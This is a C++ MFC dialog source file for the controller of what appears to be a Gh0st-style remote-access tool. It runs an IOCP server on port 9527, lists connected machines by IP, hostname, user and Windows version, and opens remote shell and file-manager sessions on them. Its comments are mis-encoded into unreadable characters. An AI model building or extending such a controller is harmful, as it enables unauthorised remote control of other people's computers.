
// SevenServerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "SevenServer.h"
#include "SevenServerDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
typedef struct
{
	CString	title;
	double		nWidth;
}COLUMNSTRUCT;
COLUMNSTRUCT m_Column_Data[] = 
{
	{_T("Wan"),					0.2		},
	{_T("Lan"),					0.2		},
	{_T("Hostname"),			0.2		},
	{_T("User"),				0.1		},
	{_T("Version"),				0.2		},
	{_T("Comment"),				0.09	},
};
// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���
CIOCPServer* CSevenServerDlg::m_iocpServer = NULL;
class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CSevenServerDlg �Ի���




CSevenServerDlg::CSevenServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CSevenServerDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CSevenServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CLIENT_LISTCTRL, m_listCtrl);
}

BEGIN_MESSAGE_MAP(CSevenServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_CONTEXTMENU()
	ON_COMMAND(ID_LIST_MANAGER, &CSevenServerDlg::OnListManager)
	ON_COMMAND(ID_LIST_DISCONNECT, &CSevenServerDlg::OnListDisconnect)
END_MESSAGE_MAP()


// CSevenServerDlg ��Ϣ�������

BOOL CSevenServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������
	m_nComputerNum	=	0;
	m_Column_Count	=	6;
	InitListCtrl();

	StartIOCPServer();

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CSevenServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CSevenServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CSevenServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CSevenServerDlg::InitListCtrl()
{
	DWORD dwStyle = m_listCtrl.GetExtendedStyle();
	dwStyle |= LVS_EX_FULLROWSELECT;//ѡ��ĳ��ʹ���и�����ֻ������report����listctrl��
	dwStyle |= LVS_EX_GRIDLINES;//�����ߣ�ֻ������report����listctrl��
	m_listCtrl.SetExtendedStyle(dwStyle); //������չ���
	
	CRect rect;
	this->GetClientRect(&rect);
	int width = rect.Width();
	for (int i=0;i<m_Column_Count;i++)
	{
		m_listCtrl.InsertColumn(i,m_Column_Data[i].title,LVCFMT_LEFT,(int)(width*m_Column_Data[i].nWidth));
	}
}

void CSevenServerDlg::OnSize(UINT nType, int cx, int cy)
{
	//////////////////////////////////////////////////////////////////////////
	// move list ctrl
	//////////////////////////////////////////////////////////////////////////
	if (NULL == m_listCtrl)
	{
		return;
	}
	CDialogEx::OnSize(nType, cx, cy);
	CRect rect;
	this->GetClientRect(&rect);
	m_listCtrl.MoveWindow(rect);
	int width = rect.Width();
	for (int i=0;i<m_Column_Count;i++)
	{
		m_listCtrl.SetColumnWidth(i,(int)(width*m_Column_Data[i].nWidth));
	}
	// TODO: �ڴ˴������Ϣ����������
}


void CSevenServerDlg::OnContextMenu(CWnd* /*pWnd*/, CPoint /*point*/)
{
	// TODO: �ڴ˴������Ϣ����������
	if (m_listCtrl.GetSelectedCount() <= 0)
	{
		return;
	}
	//�������δ���, ��������Ӧ��ListCtrl
	CMenu menu, *pPopup;
	menu.LoadMenu(IDR_LIST_MENU);
	pPopup = menu.GetSubMenu(0);
	CPoint myPoint;
	ClientToScreen(&myPoint);
	GetCursorPos(&myPoint); //���λ��
	pPopup->TrackPopupMenu(TPM_LEFTALIGN|TPM_RIGHTBUTTON, myPoint.x, myPoint.y,this);
}
void CSevenServerDlg::StartIOCPServer()
{
	m_iocpServer = new CIOCPServer;
	m_iocpServer->Initialize(NotifyProc,this,10000,9527);
}
void CALLBACK CSevenServerDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode)
{
	try
	{
		CSevenServerDlg* pThis = (CSevenServerDlg*) lpParam;
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			pThis->OnDisconnect(pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			pThis->ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			pThis->ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}
void CSevenServerDlg::ProcessReceive(ClientContext *pContext)
{
	return;
}
void CSevenServerDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SHELL_DLG:
			((CCmdDialog *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}
	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case BASE_TOKEN_HEARTBEAT: // �ظ�������
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;
	case BASE_TOKEN_LOGIN: // ���߰�
		{
			if (m_iocpServer->m_nMaxConnections <= m_listCtrl.GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				AddToList(pContext);
			}
			// ����
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
		break;
	case SHELL_TOKEN_START:
		{
			Cmd *CmdInfo;
			CmdInfo = (Cmd *)pContext->m_DeCompressionBuffer.GetBuffer();
			((ClientDlg*)(CmdInfo->DialogPointer))->OnReceiveComplete(pContext);

		}
		break;
	case FILE_TOKEN_START:
		{
			Cmd *CmdInfo;
			CmdInfo = (Cmd *)pContext->m_DeCompressionBuffer.GetBuffer();
			((ClientDlg*)(CmdInfo->DialogPointer))->OnReceiveComplete(pContext);

		}
		break;
		// ����ֹͣ��ǰ����
	default:
		closesocket(pContext->m_Socket);
		break;
	}
	return;
}
void CSevenServerDlg::OnDisconnect(ClientContext* pContext)
{
	return;
}
int CSevenServerDlg::AddToList(ClientContext* pContext)
{
	LOGININFO*	LoginInfo;
	if (pContext == NULL)
		return FALSE;
	CString	strToolTipsText, strOS;
	try
	{
		int nCnt = m_listCtrl.GetItemCount();
		// ���Ϸ������ݰ�
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;
		LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
	//////////////////////////////////////////////////////////////////////////
		//  Ip  wan/lan ��ʾ
		// ����IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);

		CString IPAddress;
		if (INVALID_SOCKET != bResult)
			IPAddress = inet_ntoa(sockAddr.sin_addr); 
		else
			IPAddress = _T("");
		int i = m_listCtrl.InsertItem(nCnt, IPAddress);
		//////////////////////////////////////////////////////////////////////////
		// ����IP
		CString LanIPstr;
		LanIPstr = inet_ntoa((LoginInfo->IPAddress));
		m_listCtrl.SetItemText(i, 1, LanIPstr);
		//////////////////////////////////////////////////////////////////////////
		// ������
		CString HostNameStr;
		HostNameStr = LoginInfo->HostName;
		m_listCtrl.SetItemText(i, 2, HostNameStr);
		//////////////////////////////////////////////////////////////////////////
		// �û���
		CString UserNameStr;
		UserNameStr = LoginInfo->UserName;
		m_listCtrl.SetItemText(i, 3, UserNameStr);
		//////////////////////////////////////////////////////////////////////////
		// ϵͳ
		// ��ʾ�����Ϣ
		CString pszOS;
		if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
			pszOS = "NT";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			pszOS = "Windows 2000";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			pszOS = "Windows XP";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wSuiteMask & VER_SUITE_WH_SERVER))
			pszOS = "Windows Home Server ";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows Vista";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2008";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows 7";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2008 R2";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows 8";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2012";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows 8.1";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2012 R2";
		else
		{pszOS = "unknown";}

		strOS.Format(
			_T("%s SP%d (Build %d)"),
			//OsVerInfo.szCSDVersion,
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor, 
			LoginInfo->OsVerInfoEx.dwBuildNumber);
		m_listCtrl.SetItemText(i, 4, strOS);
	
		// ָ��Ψһ��ʶ
		m_listCtrl.SetItemData(i, (DWORD) pContext);
	}catch(...){}

	return 0;
}


void CSevenServerDlg::OnListManager()
{
	int nItemCount =  m_listCtrl.GetNextItem(-1,LVIS_SELECTED);
	CString title;
	title = _T("Client: ");
	title += m_listCtrl.GetItemText(nItemCount,0);
	title += _T(" HostName: ") + m_listCtrl.GetItemText(nItemCount,2);
	ClientDlg * pClientDlg = new ClientDlg;
	pClientDlg->Create(IDD_CLIENTDLG, GetDesktopWindow());
	pClientDlg->SetWindowText(title);
	DWORD dwClientContext = m_listCtrl.GetItemData(nItemCount);
	pClientDlg->SetIOCPServerAndContext(m_iocpServer,dwClientContext);
	pClientDlg->SendCmdCommand((int)pClientDlg);
	pClientDlg->SendFileCommand((int)pClientDlg);
	pClientDlg->ShowWindow(TRUE);
	
	//////////////////////////////////////////////////////////////////////////

	//////////////////////////////////////////////////////////////////////////
	// TODO: �ڴ���������������
}


void CSevenServerDlg::OnListDisconnect()
{

	// TODO: �ڴ���������������
}